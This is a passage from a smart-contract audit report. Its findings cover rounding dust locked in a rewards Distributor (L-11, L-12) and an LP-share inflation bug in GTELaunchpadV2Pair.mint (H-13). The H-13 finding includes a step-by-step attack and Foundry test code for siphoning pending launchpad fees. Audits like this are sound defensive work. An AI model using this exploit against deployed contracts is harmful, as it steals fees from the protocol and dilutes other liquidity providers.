    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardsDustLockTest is Test {
    Distributor distributor;
    TestERC20 base;
    TestERC20 quote;

    address launchpad = address(this);
    address staker = address(0x1);
    address rewardsProvider = address(0x2);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new TestERC20("BASE", "B");
        quote = new TestERC20("QUOTE", "Q");

        // create rewards pair as launchpad
        distributor.createRewardsPair(address(base), address(quote));

        // give staker some shares via increaseStake
        distributor.increaseStake(address(base), staker, 3);

        // mint rewards tokens to provider
        base.mint(rewardsProvider, 10 ether);
    }

    function test_rounding_dust_gets_locked_and_cannot_be_skimmed() public {
        // provider adds 10 base tokens as rewards
        vm.startPrank(rewardsProvider);
        base.approve(address(distributor), 10 ether);
        distributor.addRewards(address(base), address(quote), uint128(10 ether), 0);
        vm.stopPrank();

        // staker claims rewards; due to rounding, they receive 10e18 - 1 wei
        vm.prank(staker);
        (uint256 claimedBase,) = distributor.claimRewards(address(base));
        assertEq(claimedBase, 10 ether - 1, "expected 1 wei rounding loss");

        // 1 wei remains in Distributor, and totalPendingRewards tracks it
        uint256 remaining = base.balanceOf(address(distributor));
        assertEq(remaining, 1, "expected exactly 1 wei remaining");
        uint256 totalPending = distributor.totalPendingRewards(address(base));
        assertEq(totalPending, 1, "totalPending should equal the dust remainder");

        // no user can claim the dust
        (uint256 pBase, uint256 pQuote) = distributor.getPendingRewards(address(base), staker);
        assertEq(pBase, 0, "no further base rewards claimable");
        assertEq(pQuote, 0, "no quote rewards claimable");

        // owner cannot skim the residual dust because it's counted in totalPending
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(base), remaining);
    }
}


## Suggested Mitigation
Keep global and per-pool accounting aligned by handling the division remainder during updates.
Option A (carry remainder forward):
- In RewardsTrackerLib.update, compute the distributed portion and the remainder explicitly:
  deltaPerShare = (pending * PRECISION_FACTOR) / totalShares;
  distributed = (deltaPerShare * totalShares) / PRECISION_FACTOR;
  remainder = pending - distributed;
- Apply acc += deltaPerShare only if deltaPerShare > 0.
- Set pending = remainder (do NOT delete). This ensures unallocated dust is kept in pending and can be combined with future rewards to eventually become claimable.

Option B (adjust global pending):
- If you prefer not to carry remainder in pool state, compute the same remainder in update and subtract it from Distributor.totalPendingRewards[asset] at the time update is applied. That requires plumbing: make update return the per-asset remainder so the caller (Distributor) can _decreaseTotalPending(asset, remainder). Admin can then skimExcessRewards safely for true excess.

Additionally, consider strengthening skimExcessRewards to use an internal view of maximum claimable (e.g., sum over pools of claimable amounts) if multiple pools/assets are supported, but the primary fix is to either keep and re-distribute the remainder (A) or decrease global pending by it (B).


## [L-11]. Rounding between RewardsTrackerLib and Distributor.totalPendingRewards permanently locks reward dust

### Finding Severity Justification: Rounding in RewardsTrackerLib.update() floors the per-share accrual and then zeroes pending rewards, orphaning the remainder. totalPendingRewards is only reduced on actual payouts, so the orphaned remainder remains counted as pending and cannot be skimmed. Impact is limited to dust-scale amounts per update (typically ≤ 1 base unit when totalShares < PRECISION and small even when larger), with no realistic user capital loss, hence Low per rubric for rounding/dust issues.
## Derived From Pattern/Invariant
Rounding in rewards index vs totalPendingRewards causes permanently locked reward dust

## Exploit Type
RoundingError

## Location
RewardsTrackerLib / Distributor.update / skimExcessRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Distributor tracks global reward obligations per asset using `totalPendingRewards[asset]`, while per-pool reward distribution is handled inside `RewardsTrackerLib` via `pendingBaseRewards`, `pendingQuoteRewards`, and per-share indices `accBaseRewardPerShare` / `accQuoteRewardPerShare`.

When rewards are added:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount); // pendingBaseRewards += amount
        _increaseTotalPending(launchAsset, launchAssetAmount); // totalPendingRewards[asset] += amount
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    ...
}
```

Later, `RewardsTrackerLib.update` applies `pending*Rewards` to the per-share indices and zeroes them:

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards; // <-- zeroed here
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}
```

`getAccRewardsPerShare` uses **floor-division** when spreading pending rewards across shares:

```solidity
if (self.pendingBaseRewards > 0) {
    accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
}
```

This means that, for a given pending amount `A` and `totalShares`, the total rewards allocated to users via the index is strictly less than `A` whenever `A * PRECISION_FACTOR` is not divisible by `totalShares` and further per-user rounding occurs. The leftover "dust" is discarded at the per-pool level when `pending*Rewards` is deleted.

However, `Distributor.totalPendingRewards[asset]` is **not** reduced when `pending*Rewards` is zeroed—only when actual transfers happen in `_distributeAssets`:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount); // totalPendingRewards[base] -= baseAmount
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

As a result, over time, `totalPendingRewards[asset]` can become **larger** than the sum of all actual rewards still claimable by users under the per-share accounting, by exactly the accumulated dust lost at each `update()` call.

At the same time, `skimExcessRewards` relies on `totalPendingRewards` as the upper bound for funds that may not be skimmed:

```solidity
function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

But because `totalPendingRewards[asset]` is overstated, any rounding dust left in the contract balance will satisfy:

`asset.balanceOf(this) - totalPendingRewards[asset] == 0`,

so the owner cannot withdraw it as excess. At the same time, users cannot claim it either, since it's no longer represented in `pending*Rewards` or reflected in `acc*RewardPerShare` deltas.

For example, with 3 users each holding 1 share and `PRECISION_FACTOR = 1e12`, if the admin or launchpad adds exactly 1 token of rewards:

- `pendingBaseRewards = 1` and `totalShares = 3`.
- `update()` computes `Δ = floor(1 * 1e12 / 3) = 333333333333` and sets `pendingBaseRewards = 0`.
- For each user: `pendingReward = floor(1 * Δ / 1e12) = 0`.
- After all users claim, no one receives any tokens, `totalPendingRewards[asset]` remains `1`, and the Distributor still holds 1 token.
- `skimExcessRewards(asset, 1)` reverts (SkimOverflow) because `asset.balanceOf(this) - totalPendingRewards[asset] = 1 - 1 = 0`.

Thus, a non-trivial fraction of contributed rewards—especially in low-liquidity or small-share scenarios—becomes permanently locked in the contract and is neither claimable by users nor withdrawable by the admin.

## Impact
The loss is not limited to dust. If totalShares > PRECISION_FACTOR, then for any reward addition A where (A * PRECISION_FACTOR) / totalShares == 0, update() will set deltaIndex = 0 and delete pending*Rewards entirely. This zeroes the whole A from user-claimable state while totalPendingRewards[asset] remains increased by A, making the entire deposit permanently stuck (users cannot claim it; admin cannot skim it because balance - totalPendingRewards == 0). Even when deltaIndex > 0, integer rounding at both the pool and per-user levels leaves a remainder that is not reconciled with totalPendingRewards, causing overstated liabilities and accumulating unskimmable balance. Repeated small reward additions (e.g., fee trickles) can therefore lead to significant, permanently locked balances.

## Command to Run Test


## Proof of Concept
1. Deploy `Distributor` and initialize it with some `launchpad` address.
2. Create a rewards pair for `(launchAsset, quoteAsset)` and give the pool 3 total shares via `increaseStake` for three different user addresses (each with 1 share).
3. Mint exactly 1 token of `launchAsset` and call `Distributor.addRewards(launchAsset, quoteAsset, 1, 0)`.
4. Each of the 3 users calls `Distributor.claimRewards(launchAsset)`. Due to integer rounding with `PRECISION_FACTOR = 1e12` and `totalShares = 3`, each user’s pending amount computes to 0, so no one receives any tokens.
5. After all claims:
   - `launchAsset.balanceOf(distributor) == 1` (the 1 token is still in the contract), and
   - `totalPendingRewards[launchAsset] == 1` (no `_decreaseTotalPending` calls happened).
6. The owner attempts to call `skimExcessRewards(launchAsset, 1)`. The call reverts with `SkimOverflow` because `asset.balanceOf(this) - totalPendingRewards[asset] == 1 - 1 == 0`.
7. There is no future combination of stakes or claims that can ever distribute this 1 token, since `pendingBaseRewards` has been deleted and future index increments will only apply to new `addRewards` calls.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20Dust {
    string public name = "L";
    string public symbol = "L";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract RewardsDustLockTest is Test {
    Distributor dist;
    MockERC20Dust launch;
    MockERC20Dust quote;
    address launchpad;

    address u1 = address(0x111);
    address u2 = address(0x222);
    address u3 = address(0x333);

    function setUp() public {
        dist = new Distributor();
        launch = new MockERC20Dust();
        quote = new MockERC20Dust();
        launchpad = address(this);

        dist.initialize(launchpad);

        vm.prank(launchpad);
        dist.createRewardsPair(address(launch), address(quote));

        // three users with one share each
        vm.startPrank(launchpad);
        dist.increaseStake(address(launch), u1, 1);
        dist.increaseStake(address(launch), u2, 1);
        dist.increaseStake(address(launch), u3, 1);
        vm.stopPrank();
    }

    function test_rounding_dust_locked_and_cannot_be_skimmed() public {
        // add exactly 1 unit of rewards
        launch.mint(address(this), 1);
        launch.approve(address(dist), 1);
        dist.addRewards(address(launch), address(quote), 1, 0);

        // all three users claim; each gets 0 due to rounding
        vm.prank(u1);
        dist.claimRewards(address(launch));
        vm.prank(u2);
        dist.claimRewards(address(launch));
        vm.prank(u3);
        dist.claimRewards(address(launch));

        assertEq(launch.balanceOf(address(dist)), 1, "dust reward not retained in distributor");
        assertEq(dist.totalPendingRewards(address(launch)), 1, "totalPendingRewards not tracking dust");

        // owner cannot skim the dust
        vm.expectRevert(Distributor.SkimOverflow.selector);
        dist.skimExcessRewards(address(launch), 1);
    }
}


## Suggested Mitigation
Carry forward the undistributed remainder in pending*Rewards instead of deleting the entire amount. In RewardsTrackerLib.update(), compute the per-share delta and the exact distributed amount, then subtract only the distributed amount from pending:

- Let totalShares = self.totalShares; if totalShares == 0, do nothing (keep pending*Rewards as-is).
- For base: delta = (self.pendingBaseRewards * PRECISION_FACTOR) / totalShares. If delta > 0, then:
  - self.accBaseRewardPerShare += delta;
  - distributed = uint128((uint256(delta) * totalShares) / PRECISION_FACTOR);
  - self.pendingBaseRewards -= distributed; // remainder carried forward
  - Do not delete pendingBaseRewards when delta == 0.
- Mirror the same logic for quote rewards.

This ensures that rounding remainders accumulate in pending and will be included in future updates, eventually becoming claimable when enough rewards accrue. With this change, totalPendingRewards in Distributor stays consistent with the sum of claimable rewards, and no tokens become permanently unskimmable. Additionally, keep the existing rule that totalPendingRewards is only decreased upon actual payouts.


## [L-12]. Rounding in RewardsTrackerLib combined with totalPendingRewards prevents withdrawal of accumulated reward dust

### Finding Severity Justification: The issue results in reward "dust" becoming permanently unclaimable due to integer division rounding in RewardsTrackerLib.update(). While funds are not stolen, a small fraction of rewards per accrual cycle remains locked in the Distributor. This is a classic dust-lock pattern with limited impact per event; although it can accumulate, it generally does not threaten principal or protocol solvency.
## Derived From Pattern/Invariant
Rounding in rewards index vs totalPendingRewards causes permanently locked reward dust

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.skimExcessRewards / RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Rewards distribution uses two layers of accounting:

1. Per-pool state in `RewardPoolData`:
   * `pendingBaseRewards`, `pendingQuoteRewards` (uint128)
   * `accBaseRewardPerShare`, `accQuoteRewardPerShare` (uint256, scaled by 1e12)
2. Global per-asset state in `Distributor.totalPendingRewards[asset]` (uint256), intended as an upper bound on claimable rewards and to protect against admin skimming.

When rewards are added:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount); // pendingBaseRewards += amount
        _increaseTotalPending(launchAsset, launchAssetAmount); // totalPendingRewards[asset] += amount
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    ...
}
```

Later, `RewardsTrackerLib.update()` converts `pending*Rewards` into index increments and zeros the pending fields:

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}
```

`getAccRewardsPerShare` uses integer division when spreading rewards over shares:

```solidity
if (self.pendingBaseRewards > 0) {
    accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
}
```

Because of floor-division, each `update()` can leave a small remainder:

```text
remainder_base = pendingBaseRewards -
    floor(pendingBaseRewards * PRECISION_FACTOR / totalShares) * totalShares / PRECISION_FACTOR
```

This remainder is implicitly **discarded at the pool level** when `pendingBaseRewards` is set to zero, but `Distributor.totalPendingRewards[asset]` is **not adjusted** at that moment. Instead, `totalPendingRewards` is decreased only when users actually receive tokens via `_distributeAssets`:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount); // totalPendingRewards[base] -= baseAmount
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

Over time, the sum of user claims after each update is **strictly less** than the sum of all `addRewards` calls, due to per-share rounding. The unclaimed dust remains in the Distributor’s token balance and continues to be reflected in `totalPendingRewards[asset]`.

When all users eventually unstake and claim everything, the reward pool may end up with:

* `totalShares == 0`
* `pending*Rewards == 0`
* `acc*RewardPerShare` fixed
* `Distributor.totalPendingRewards[asset] > 0`
* A matching positive token balance in the Distributor contract corresponding to the cumulative rounding remainders

However, no user can claim this dust (they have 0 shares), and the admin cannot withdraw it either, because `skimExcessRewards` only allows skimming balances *above* `totalPendingRewards`:

```solidity
function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

Since `asset.balanceOf(this) == totalPendingRewards[asset]` in the fully-distributed path (all rounding dust counted as "still pending"), `asset.balanceOf - totalPendingRewards == 0`, so `amount > 0` always reverts. The cumulative rounding dust is thus **permanently locked** in the Distributor contract.

While each individual remainder is small, over many reward epochs and high-volume pools this can add up to a non-trivial amount of stuck tokens.

## Impact
Due to per-share rounding and the way `totalPendingRewards` is maintained, a small fraction of every reward addition remains forever unclaimable once all users exit a pool. That dust cannot be claimed by users or skimmed by the admin and accumulates locked in the Distributor contract.

## Command to Run Test


## Proof of Concept
1. Deploy a small harness wrapping `RewardPoolData` and a local `totalPendingRewards` mapping.
2. Have three users each stake 1 share.
3. Call `addRewards(100)` for the base asset, increasing both `pendingBaseRewards` and `totalPendingRewards[asset]` by 100.
4. Have each of the three users call `claim()` once, which internally calls `update()` then computes per-user rewards using integer division. With 3 shares and 100 rewards, each user receives 33, so total claimed is 99.
   - `pendingBaseRewards` is set to 0 in `update()`.
   - `totalPendingRewards[asset]` and a simulated token balance both decrease by 99, leaving value 1.
5. Have each user fully `unstake(1)`, so `totalShares` becomes 0 and no further claims are possible.
6. Now check that:
   - The simulated contract balance still holds 1 unit of reward dust.
   - `totalPendingRewards[asset] == 1`.
   - A function that computes `balance - totalPendingRewards` (what `skimExcessRewards` uses) returns 0, so the admin cannot withdraw the dust either.

This demonstrates that rounding dust persists in the Distributor with no path for either users or admin to recover it.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/libraries/RewardsTracker.sol";

contract DustHarness {
    using RewardsTrackerLib for RewardPoolData;

    RewardPoolData internal pool;
    mapping(address => uint256) public totalPendingRewards;
    mapping(address => uint256) public simulatedBalance;
    address public immutable asset;

    constructor(address _asset) {
        asset = _asset;
    }

    function stake(address user, uint96 shares) external {
        pool.stake(user, shares);
    }

    function unstake(address user, uint96 shares) external {
        (uint256 baseAmount, ) = pool.unstake(user, shares);
        if (baseAmount > 0) {
            totalPendingRewards[asset] -= baseAmount;
            simulatedBalance[asset] -= baseAmount;
        }
    }

    function addRewards(uint128 amount) external {
        pool.addBaseRewards(asset, amount);
        totalPendingRewards[asset] += amount;
        simulatedBalance[asset] += amount;
    }

    function claim(address user) external {
        (uint256 baseAmount, ) = pool.claim(user);
        totalPendingRewards[asset] -= baseAmount;
        simulatedBalance[asset] -= baseAmount;
    }

    function excess() external view returns (uint256) {
        // Mimic Distributor.skimExcessRewards check: balance - totalPendingRewards
        return simulatedBalance[asset] - totalPendingRewards[asset];
    }
}

contract DustAccountingTest is Test {
    function testRoundingDustCannotBeClaimedOrSkimmed() public {
        address dummyAsset = address(0xAAAA);
        DustHarness h = new DustHarness(dummyAsset);

        address u1 = address(0x1);
        address u2 = address(0x2);
        address u3 = address(0x3);

        // three users stake one share each
        h.stake(u1, 1);
        h.stake(u2, 1);
        h.stake(u3, 1);

        // add 100 units of rewards
        h.addRewards(100);

        // everyone claims once (each gets 33, total 99 due to rounding)
        h.claim(u1);
        h.claim(u2);
        h.claim(u3);

        // fully unstake everyone so totalShares becomes 0
        h.unstake(u1, 1);
        h.unstake(u2, 1);
        h.unstake(u3, 1);

        uint256 remaining = h.simulatedBalance(dummyAsset);
        // 1 unit of dust should remain
        assertGt(remaining, 0, "expected some undistributed dust remaining");

        // totalPendingRewards still equals the simulated balance
        assertEq(remaining, h.totalPendingRewards(dummyAsset), "pending mapping should track dust");

        // but from the perspective of skimExcessRewards, there is no excess to withdraw
        assertEq(h.excess(), 0, "admin cannot skim rounding dust as excess rewards");
    }
}


## Suggested Mitigation
Two complementary mitigations:

1. **Track and re-add dust at the pool level**:
   - Instead of deleting `pending*Rewards` entirely after `update()`, keep the remainder and carry it forward into the next accrual, so eventually all contributed rewards can be claimed:
   
   ```solidity
   function update(RewardPoolData storage self) internal returns (...) {
       (uint256 newAccBase, uint256 newAccQuote) = getAccRewardsPerShare(self);

       if (self.pendingBaseRewards > 0) {
           uint96 totalShares = self.totalShares;
           uint128 used = uint128((newAccBase - self.accBaseRewardPerShare) * totalShares / PRECISION_FACTOR);
           self.accBaseRewardPerShare = newAccBase;
           self.pendingBaseRewards = self.pendingBaseRewards - used; // keep remainder
       }
       ...
   }
   ```

2. **Allow admin to skim residual dust explicitly**:
   - Add an owner-only function to reconcile `totalPendingRewards[asset]` with the maximum claimable amount when `totalShares == 0`, setting `totalPendingRewards[asset] = 0` and transferring any remaining balance to a governance-controlled address. This makes the locked dust recoverable while preserving the invariant during normal operation.

Either approach preserves the safety property that `skimExcessRewards` cannot steal user-owed rewards, while avoiding unbounded accumulation of unspendable dust.





 **Derived From** : Accrued launchpad fees mishandled in mint/burn, distorting LP share accounting

## [H-13]. Minting LP shares double-counts accrued launchpad fees, inflating attacker share of pool assets

### Finding Severity Justification: A permissionless user can siphon pending launchpad fees from the AMM pair before they are distributed to the Distributor. By exploiting a reserves/balances mismatch when timeElapsed == 0, an attacker can mint inflated LP shares (counting accrued fees as their deposit) and immediately burn them in the same block to withdraw a proportional slice of those fees. This directly steals real assets (the launchpad fee pot) and can be repeated opportunistically, resulting in ongoing loss.
## Derived From Pattern/Invariant
Accrued launchpad fees mishandled in mint/burn, distorting LP share accounting

## Exploit Type
ERC4626SharePrice

## Location
GTELaunchpadV2Pair.mint

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair tracks launchpad fees in `accruedLaunchpadFee0/1` and subtracts them from reserves in `_update`:

`uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;`
`uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;`
...
`reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;`
`reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;`

When `timeElapsed == 0` in `_update` (multiple calls in the same block), `totalLaunchpadFeeX` is *not* distributed but instead stored back in `accruedLaunchpadFeeX`. As a result, after such an update:

- `tokenBalanceX = reserveX + accruedLaunchpadFeeX`
- `getReserves()` returns `reserveX` only (excluding the accrued fees).

However, `mint()` computes the deposited amounts purely as the difference between raw balances and reserves:

`function mint(address to) external lock returns (uint256 liquidity) {
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));
    uint256 amount0 = balance0.sub(_reserve0);
    uint256 amount1 = balance1.sub(_reserve1);
    ...
    liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
}`

If there are accrued but undistributed fees `A0 = accruedLaunchpadFee0 > 0` (created by a prior same-block swap, via `_update` with `timeElapsed == 0`), then before a new LP deposit:

- `balance0 = reserve0 + A0 + deposit0`
- `_reserve0 = reserve0`
- So `amount0 = balance0 - _reserve0 = A0 + deposit0`.

This means `mint()` calculates the LP tokens to mint as if the depositor had added **both their own deposit and the protocol-owned pending launchpad fees**. The `_update` call at the end of `mint()` still subtracts `totalLaunchpadFee0` from balances when recomputing reserves, and in the next cross-block `_update` the entire `accruedLaunchpadFee0` is transferred out to the Distributor. The extra LP tokens minted on top of `A0` are never clawed back.

Consequences:
- A user can monitor for blocks where `accruedLaunchpadFee* > 0` (created by same-block swaps) and then immediately call `mint()` in the same block.
- Their LP tokens are computed from `deposit + accruedFees` rather than just `deposit`, inflating their share of the pool and diluting existing LPs.
- When the accrued fees are later distributed to the Distributor, the pool’s token balances drop by `A0` but the over-minted LP position remains, so the attacker can burn LP tokens later to withdraw **more underlying tokens than their deposit proportion would justify**.

This matches the ERC4626 share price mismatch pattern: minting uses a manipulable asset base (`balance - reserve`) that includes protocol-owned fee balances rather than strictly user-supplied assets, leading to share inflation.

## Impact
By minting when timeElapsed == 0 (same-timestamp as a prior swap that accrued launchpad fees), a user’s deposit is measured against raw balances that include protocol-owned, pending launchpad fees. This over-mints LP tokens and dilutes existing LPs. If the attacker immediately burns in the same timestamp, they can also withdraw a proportional slice of the pending fee pot before it is transferred to the Distributor, directly stealing those fees. If they delay burning, the over-minted position still extracts value over time from LPs after the eventual fee distribution.

## Command to Run Test


## Proof of Concept
High-level attack sequence:

1) Initial liquidity: Launchpad or LP seeds the pair; call mint() to set initial reserves and blockTimestampLast.
2) Create pending fees in same timestamp: In the same timestamp (timeElapsed == 0), a trader performs a swap. _update() accrues launchpad fees into accruedLaunchpadFee{0,1} and subtracts them from reserves, but does not distribute them.
3) Attacker mint: Still in the same timestamp, the attacker transfers a small, balanced deposit and calls mint(). The function computes amount{i} = balance{i} - reserve{i}, which now equals (deposit{i} + accruedLaunchpadFee{i}). LP tokens are minted as if the attacker supplied the accrued fees as part of their deposit.
4) Optional immediate burn (same timestamp): The attacker transfers the just-minted LP tokens back to the pair and calls burn() to withdraw a pro-rata share of the pool, capturing a portion of the pending launchpad fees before they are distributed to the Distributor.
5) Later distribution: On the first _update() in a later timestamp, the pending launchpad fees are transferred out to the Distributor, but the attacker’s over-minted LP position (if not already burned) remains, allowing them to later withdraw more underlying than their fair deposit share, harming other LPs.

## Proof of Code
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockFactory {
    function feeTo() external view returns (address) {
        return address(0);
    }
    function deployPair() external returns (GTELaunchpadV2Pair) {
        return new GTELaunchpadV2Pair();
    }
}

contract TestERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MintInflationTest is Test {
    GTELaunchpadV2Pair pair;
    TestERC20 token0;
    TestERC20 token1;
    MockFactory factory;

    address lp = address(0x1);
    address distributor = address(0x2);
    address trader = address(0x3);
    address attacker = address(0x4);

    function setUp() public {
        token0 = new TestERC20("T0", "T0");
        token1 = new TestERC20("T1", "T1");

        factory = new MockFactory();
        pair = factory.deployPair();
        vm.prank(address(factory));
        pair.initialize(address(token0), address(token1), lp, distributor);

        token0.mint(lp, 1_000_000 ether);
        token1.mint(lp, 1_000_000 ether);

        vm.startPrank(lp);
        token0.transfer(address(pair), 1_000_000 ether);
        token1.transfer(address(pair), 1_000_000 ether);
        pair.mint(lp);
        vm.stopPrank();

        token0.mint(trader, 200_000 ether);
        token0.mint(attacker, 10_000 ether);
        token1.mint(attacker, 10_000 ether);
    }

    function test_mint_inflates_shares_using_accrued_fees_and_optional_burn() public {
        // Force same-timestamp actions (timeElapsed == 0)
        (, , uint32 tsLast) = pair.getReserves();
        vm.warp(tsLast);

        // 1) Trader swap to create accrued launchpad fee in same timestamp
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 dx = 100_000 ether;
        uint256 amountOut = getAmountOut(dx, r0, r1);

        vm.startPrank(trader);
        token0.transfer(address(pair), dx);
        pair.swap(0, amountOut, trader, new bytes(0));
        vm.stopPrank();

        (uint112 accrued0,,) = pair.getAccruedLaunchpadFees();
        assertGt(accrued0, 0, "no accrued fees");

        // 2) Attacker adds balanced liquidity; mint() will count accrued fees as their deposit
        (r0, r1, ) = pair.getReserves();
        uint256 totalSupplyBefore = pair.totalSupply();

        uint256 dep0 = 1_000 ether;
        uint256 dep1 = dep0 * uint256(r1) / uint256(r0);

        vm.startPrank(attacker);
        token0.transfer(address(pair), dep0);
        token1.transfer(address(pair), dep1);
        uint256 attackerLpBefore = pair.balanceOf(attacker);
        uint256 liquidityMinted = pair.mint(attacker);
        vm.stopPrank();

        // Expected liquidity if only deposits were counted (no accrued fee inclusion)
        uint256 expectedLiq0 = dep0 * totalSupplyBefore / uint256(r0);
        uint256 expectedLiq1 = dep1 * totalSupplyBefore / uint256(r1);
        uint256 expectedLiquidity = expectedLiq0 < expectedLiq1 ? expectedLiq0 : expectedLiq1;

        assertEq(liquidityMinted, pair.balanceOf(attacker) - attackerLpBefore, "mint return mismatch");
        assertGt(liquidityMinted, expectedLiquidity, "no share inflation");

        // 3) Optional: attacker can immediately burn in the same timestamp to realize a slice of the pending fee pot
        vm.startPrank(attacker);
        // Transfer LP back to pair, then burn
        pair.transfer(address(pair), liquidityMinted);
        (uint256 out0, uint256 out1) = pair.burn(attacker);
        vm.stopPrank();

        // Sanity: attacker withdrew something meaningful (demonstrates realizable gains in same timestamp)
        assertTrue(out0 > 0 || out1 > 0, "no withdrawal");
    }

    function getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}


## Suggested Mitigation
Ensure protocol-owned, pending launchpad fees are excluded from LP share issuance and cannot be withdrawn by LPs before distribution:

- In mint(): compute depositor amounts using balances net of accrued fees:
